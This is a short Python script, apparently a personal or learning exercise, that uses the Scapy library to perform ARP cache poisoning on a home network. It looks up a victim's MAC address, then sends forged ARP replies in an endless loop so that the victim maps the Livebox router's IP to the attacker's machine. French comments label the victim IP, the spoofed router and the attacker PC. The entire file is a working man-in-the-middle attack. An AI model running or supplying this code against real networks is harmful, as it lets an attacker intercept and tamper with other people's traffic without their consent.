#!/usr/bin/python3.9

from scapy.all import *

def get_mac_target(ip_target):
    """ Get the mac address
    """
    arp_bdr = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip_target)
    resp, send = srp(arp_bdr)
    return resp[0][1].hwsrc

def arp_reply(ip_dest, ip_src, mac_src, mac_dst):
    """ Create an ARP Reply
    """
    pck = Ether() / ARP(op=2, psrc=ip_src, pdst=ip_dest, hwsrc=mac_src, hwdst=mac_dst)
    print('--- ARP Packet ---')
    pck.show()

    # Send pck
    resp, send = srp(pck)
    resp.show()

def arp_cache(ip_target, ip_src, mac_src):
    """ Create an ARP cache poisonning
    """
    mac_tgt = get_mac_target(ip_target)
    arp_reply(ip_target, ip_src, mac_src, mac_tgt)


ip_target = "192.168.1.38" # IP de la victime
ip_src = "192.168.1.1" # Usurpation livebox (son IP)
mac_src = "f0:d5:bf:f2:ac:83" # Mac de mon PC (attaquant)

while True:
    arp_cache(ip_target, ip_src, mac_src)
